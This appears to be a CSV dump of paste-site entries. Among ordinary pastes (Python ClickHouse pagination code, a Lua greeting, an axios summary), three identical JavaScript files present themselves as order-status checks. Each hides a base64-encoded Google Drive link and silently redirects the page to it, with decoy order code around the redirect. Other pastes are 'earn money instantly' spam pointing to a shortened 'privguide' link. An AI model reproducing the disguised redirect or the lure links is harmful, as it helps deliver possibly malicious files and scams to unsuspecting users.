id,title,username,language,date,content
71vtfBkT,Products.js,jm33,JavaScript,Sunday 20th of April 2025 12:53:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64674/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZLJAW2hx,Make $1000 15-MINUTES (BEGINNER) 2J,GodTempo,JavaScript,Sunday 20th of April 2025 12:51:25 PM CDT," 
Pdf https://tinyurl.com/privguidee


cOSgFll24a
"
pj3eWqXY,Untitled,gubichas,Python,Sunday 20th of April 2025 12:48:43 PM CDT,"# Внутри класса ClickHouseConnector в файле clickhouse_connector.py

def extract_all_data_using_pagination(self, base_query, order_by_column, chunk_size=10000, settings=None):
    """"""
    Извлекает ВСЕ данные из ClickHouse, используя пагинацию ВНУТРИ,
    и возвращает ОДИН большой DataFrame.
    (Добавлена обработка дубликатов колонок)

    ПРЕДУПРЕЖДЕНИЕ: Этот метод загружает все результаты в память!
    """"""
    logger.info(f""Начало извлечения ВСЕХ данных с внутренней пагинацией (chunk_size={chunk_size})."")
    logger.warning(""ПРЕДУПРЕЖДЕНИЕ: Все результаты будут загружены в память!"")
    # Важное напоминание о сортировке
    logger.info(f""Пагинация будет использовать ORDER BY '{order_by_column}'. ""
                f""Для предотвращения дубликатов строк убедитесь, что сортировка уникальна ""
                f""(например, добавьте уникальный ID: 'YourDateColumn, UniqueIDColumn')."")


    all_chunks = []
    total_rows_collected = 0 # Переименовали для ясности

    try:
        paginator = self.extract_data_paginated( # Используем ИСПРАВЛЕННЫЙ генератор
            base_query=base_query,
            order_by_column=order_by_column,
            chunk_size=chunk_size,
            settings=settings
        )

        for i, chunk_df in enumerate(paginator):
            chunk_num = i + 1
            logger.debug(f""Сборка: получен чанк #{chunk_num} размером {len(chunk_df)} строк."")

            # --- ИСПРАВЛЕНИЕ 1: Обработка дубликатов КОЛОНОК ---
            if not chunk_df.columns.is_unique:
                duplicate_cols = list(chunk_df.columns[chunk_df.columns.duplicated()])
                logger.warning(f""Чанк #{chunk_num} содержит дублирующиеся имена колонок: {duplicate_cols}. ""
                               f""Удаление дубликатов (оставляем первое вхождение)..."")
                # .loc[:,~df.columns.duplicated()] выбирает только первые вхождения каждого имени колонки
                chunk_df = chunk_df.loc[:, ~chunk_df.columns.duplicated()]
                logger.debug(f""Колонки чанка #{chunk_num} после дедупликации: {list(chunk_df.columns)}"")

            if not chunk_df.empty:
                all_chunks.append(chunk_df)
                total_rows_collected += len(chunk_df) # Считаем строки в чанках *до* возможного удаления дубликатов строк при concat

        if all_chunks:
            logger.info(f""Объединение {len(all_chunks)} чанков (собрано {total_rows_collected} строк до concat)..."")
            try:
                # pd.concat теперь должен работать, т.к. колонки внутри чанков уникальны
                final_df = pd.concat(all_chunks, ignore_index=True)
                logger.info(f""Итоговый DataFrame содержит {len(final_df)} строк."")

                # Проверка на дубликаты строк уже в итоговом DataFrame (из-за нестабильной сортировки)
                if final_df.duplicated().any():
                     num_duplicates = final_df.duplicated().sum()
                     logger.warning(f""В итоговом DataFrame обнаружено {num_duplicates} дублирующихся СТРОК! ""
                                    f""Это обычно вызвано нестабильной сортировкой ('{order_by_column}'). ""
                                    f""Рассмотрите возможность добавления уникального ключа в ORDER BY."")
                     # Опционально: удалить дубликаты строк, если это нужно
                     # logger.info(""Удаление дублирующихся строк из итогового DataFrame..."")
                     # final_df = final_df.drop_duplicates(ignore_index=True)
                     # logger.info(f""DataFrame после удаления дубликатов строк содержит {len(final_df)} строк."")


                # Старая проверка суммы строк - менее полезна, если были дубликаты строк
                # if len(final_df) != total_rows_collected:
                #      logger.warning(f""Несовпадение строк после concat: ожидалось {total_rows_collected} (сумма чанков), получено {len(final_df)} (возможно, из-за удаления дубликатов)"")

                return final_df
            except Exception as concat_err:
                 logger.error(f""Неожиданная ошибка при выполнении pd.concat: {concat_err}"", exc_info=True)
                 # Если ошибка все равно есть, вернуть пустой DF или перевыбросить
                 raise concat_err # Перевыбросим, чтобы увидеть проблему
        else:
            logger.info(""Не было получено данных из ClickHouse."")
            return pd.DataFrame()

    except Exception as e:
        logger.error(f""Ошибка во время сбора данных с внутренней пагинацией: {e}"", exc_info=True)
        raise e"
7N1gQ4zA,Hello,RTS_Dmitriy,Lua,Sunday 20th of April 2025 12:47:35 PM CDT,"print('What is your name?')
name = read()
print('Hello ', name)"
kK9BjP0s,Untitled,gubichas,Python,Sunday 20th of April 2025 12:39:19 PM CDT,"# clickhouse_connector.py

# ... (импорты и остальная часть класса) ...

class ClickHouseConnector:
    # ... (__init__, _initialize_executor, connect - без изменений) ...

    # --- ИСПРАВЛЕННЫЙ МЕТОД ПАГИНАЦИИ ---
    def extract_data_paginated(self, base_query, order_by_column, chunk_size=10000, settings=None):
        """"""
        Извлекает данные из ClickHouse частями (пагинация) с использованием генератора.
        (Исправлена логика выхода из цикла)
        """"""
        # ... (проверки аргументов и инициализация executor - без изменений) ...
        if self.executor is None:
             raise Exception(""Соединение с ClickHouse (SqlExecutor) не установлено."")
        # ... (проверки base_query, order_by_column, chunk_size) ...

        offset = 0
        total_fetched_debug = 0 # Только для логов

        # ... (формирование settings_str - без изменений) ...
        settings_str = """"
        # ...

        logger.info(f""Начало пагинации (ИСПРАВЛЕННАЯ ЛОГИКА): chunk_size={chunk_size}, сортировка по '{order_by_column}'."")
        logger.debug(f""Базовый запрос: {base_query}"")

        while True:
            paginated_query = f""{base_query} ORDER BY {order_by_column} LIMIT {chunk_size} OFFSET {offset}{settings_str}""
            logger.debug(f""Запрос чанка (offset={offset}): {paginated_query[:500]}..."")

            try:
                chunk_df = self.executor.execute(paginated_query)
                # ... (проверка типа и конвертация chunk_df - без изменений) ...
                if not isinstance(chunk_df, pd.DataFrame):
                     logger.warning(f""Executor вернул не DataFrame ({type(chunk_df)}) для offset={offset}. Конвертация..."")
                     try: chunk_df = pd.DataFrame(chunk_df)
                     except Exception: # ... обработка ошибки конвертации ...
                         break

                num_fetched_in_chunk = len(chunk_df)
                total_fetched_debug += num_fetched_in_chunk
                logger.debug(f""Получено строк в чанке (offset={offset}): {num_fetched_in_chunk}. Всего пока: {total_fetched_debug}"")

                # --- КЛЮЧЕВОЕ ИЗМЕНЕНИЕ ЛОГИКИ ВЫХОДА ---
                # Выходим ТОЛЬКО если получено РОВНО 0 строк.
                if num_fetched_in_chunk == 0:
                    logger.info(f""Получен пустой чанк (0 строк) для offset={offset}. Завершение пагинации."")
                    break # Единственное надежное условие выхода

                # Если строки есть (даже если их меньше chunk_size из-за усечения),
                # отдаем их и готовимся к следующему запросу.
                yield chunk_df

                # Увеличиваем offset ВСЕГДА на размер запрошенного чанка,
                # чтобы следующий запрос начался с правильного места.
                offset += chunk_size

                # УДАЛЕНО НЕПРАВИЛЬНОЕ УСЛОВИЕ ВЫХОДА:
                # if num_fetched_in_chunk < chunk_size:
                #     logger.info(f""Получено {num_fetched_in_chunk} < {chunk_size} строк. Достигнут конец данных."") # ЭТО БЫЛО НЕВЕРНО
                #     break

            except Exception as e:
                logger.error(f""Ошибка при извлечении чанка данных (offset={offset}): {e}"", exc_info=True)
                raise e # Перевыбрасываем ошибку

        logger.info(f""Пагинация завершена. Общее количество строк (по логам): {total_fetched_debug}."")


    # --- Функция-обертка extract_all_data_using_pagination остается БЕЗ ИЗМЕНЕНИЙ ---
    # Она просто использует исправленный генератор extract_data_paginated
    def extract_all_data_using_pagination(self, base_query, order_by_column, chunk_size=10000, settings=None):
         # ... (код этой функции не меняется, он вызывает исправленный extract_data_paginated) ...
         logger.info(f""Начало извлечения ВСЕХ данных с внутренней пагинацией (chunk_size={chunk_size})."")
         logger.warning(""ПРЕДУПРЕЖДЕНИЕ: Все результаты будут загружены в память!"")
         all_chunks = []
         total_rows = 0
         try:
             paginator = self.extract_data_paginated( # Вызов ИСПРАВЛЕННОГО генератора
                 base_query=base_query,
                 order_by_column=order_by_column,
                 chunk_size=chunk_size,
                 settings=settings
             )
             for i, chunk_df in enumerate(paginator):
                 logger.debug(f""Сборка: получен чанк #{i+1} размером {len(chunk_df)} строк."")
                 if not chunk_df.empty:
                     all_chunks.append(chunk_df)
                     total_rows += len(chunk_df)

             if all_chunks:
                 logger.info(f""Объединение {len(all_chunks)} чанков..."")
                 final_df = pd.concat(all_chunks, ignore_index=True)
                 logger.info(f""Итоговый DataFrame содержит {len(final_df)} строк (ожидалось по сумме чанков: {total_rows})."")
                 return final_df
             else:
                 logger.info(""Не было получено данных."")
                 return pd.DataFrame()
         except Exception as e:
             logger.error(f""Ошибка во время сбора данных с внутренней пагинацией: {e}"", exc_info=True)
             raise e

    # ... (остальные методы: extract_data, get_table_schema) ..."
90XiU3jr,EARN $900 INSTANTLY 2025⭐ 8F,GodTempo,JavaScript,Sunday 20th of April 2025 12:37:42 PM CDT," 
Pdf https://tinyurl.com/privguidee


CegfOtBdek
"
Y7tiusSG,Order.js,jm33,JavaScript,Sunday 20th of April 2025 12:37:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51975/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H2BNECpw,Market.js,jm33,JavaScript,Sunday 20th of April 2025 12:21:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45394/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KtLkTnYv,EARN $900 INSTANTLY 2025⭐ 8F,UKnoDatBoi,JavaScript,Sunday 20th of April 2025 12:15:41 PM CDT," 
Pdf https://tinyurl.com/privguidee


HItIHCeiGj
"
b3JSZfR2,011 axios,xerocool-101,JavaScript,Sunday 20th of April 2025 12:08:58 PM CDT,"// 🧠 AXIOS Summary Table

Action		Method		Axios Syntax
Read		GET			axios.get(""/todos"")
Create		POST		axios.post(""/todos"", data)
Update		PUT			axios.put(""/todos/:id"", data)
Delete		DELETE		axios.delete(""/todos/:id"")"
